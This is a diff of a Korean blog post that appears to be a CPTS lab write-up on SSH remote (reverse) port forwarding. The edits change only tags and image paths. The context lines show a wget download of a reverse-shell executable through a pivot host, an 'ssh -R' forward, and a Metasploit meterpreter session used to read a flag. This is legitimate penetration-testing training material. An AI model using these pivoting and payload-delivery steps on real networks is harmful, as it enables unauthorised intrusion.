@@ -8,8 +8,8 @@ toc: true
 toc_label: "Remote Port Forwarding"
 toc_icon: "network-wired"
 toc_sticky: true
-tags: [networking, ssh, tunneling, pivoting, reverse]
-categories: [network]
+tags: [cpts, networking, ssh, tunneling, pivoting, reverse]
+categories: [cpts-network]
 ---
 
 **Remote(Reverse) Port Forwarding**은 로컬에서 실행 중인 서비스를 원격 SSH 서버의 특정 포트에 바인딩하여, 원격 네트워크 또는 내부망 호스트가 그 포트를 통해 해당 서비스에 접근할 수 있게 하는 기술이다. 
@@ -25,7 +25,7 @@ categories: [network]
 공격 호스트(`10.10.15.5`)는 **Ubuntu 서버**(`10.129.15.50`, `172.16.5.129`)에 SSH 접속이 가능하며,  
 Ubuntu 서버를 통해 내부망 Windows 호스트(`172.16.5.19`)의 RDP 서비스에 접근할 수 있다.
 
-![Remote Port Forwarding Diagram](/assets/network-screenshots/remote-port-forwarding/remote-port-forwarding.png)
+![Remote Port Forwarding](/assets/cpts-network/remote-port-forwarding/remote-port-forwarding.png)
 
 그러나 Windows 호스트는 **공격 호스트(10.10.x.x)** 와 직접 라우팅이 불가능하다.  
 따라서 Windows에서 **공격 호스트로 직접 Reverse Shell**을 보낼 경우 트래픽이 도달하지 못한다.
@@ -81,7 +81,7 @@ $ ssh -D 9050 ubuntu@10.129.243.159
 
 접속 후, `ifconfig` 명령어를 통하여 내부망 인터페이스를 확인하였다.
 
-![Domain](/assets/network-screenshots/remote-port-forwarding/ifconfig.png)
+![Remote Port Forwarding](/assets/cpts-network/remote-port-forwarding/ifconfig.png)
 
 그 결과 내부망 IP 주소 `172.16.5.129` 를 확인할 수 있었다.
 
@@ -121,7 +121,7 @@ wget http://172.16.5.129:9999/backupscript.exe -o backupscript.exe
 
 성공적으로 파일을 다운로드하였다.
 
-![Domain](/assets/network-screenshots/remote-port-forwarding/rdp-wget.png)
+![Remote Port Forwarding](/assets/cpts-network/remote-port-forwarding/rdp-wget.png)
 
 ## Remote Port Forwarding
 
@@ -135,11 +135,11 @@ $ ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.243.159 -vN
 
 명령 실행 후, Metasploit의 `msfconsole`을 실행하여 리버스 연결을 수신할 리스너를 설정하였다.
 
-![Domain](/assets/network-screenshots/remote-port-forwarding/msfconsole.png)
+![Remote Port Forwarding](/assets/cpts-network/remote-port-forwarding/msfconsole.png)
 
 이후 RDP 세션으로 돌아가 다운로드한 `backupscript.exe` 파일을 실행하였다.
 
-![Domain](/assets/network-screenshots/remote-port-forwarding/rdp-remote-success.png)
+![Remote Port Forwarding](/assets/cpts-network/remote-port-forwarding/rdp-remote-success.png)
 
 잠시 후, Metasploit에서 `meterpreter` 세션이 활성화되었고
 `ls` 명령어를 통해 **내부 파일/디렉터리 열람이 가능함을 확인**하였다.
@@ -150,7 +150,7 @@ $ ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.243.159 -vN
 
 Desktop으로 이동 후 `flag.txt` 파일 내용을 읽어 플래그를 획득하였다.
 
-![Domain](/assets/network-screenshots/remote-port-forwarding/flag.png)
+![Remote Port Forwarding](/assets/cpts-network/remote-port-forwarding/flag.png)
 
 이로써 **Remote(Reverse) Port Forwarding** 실습을 마무리하였다.
 
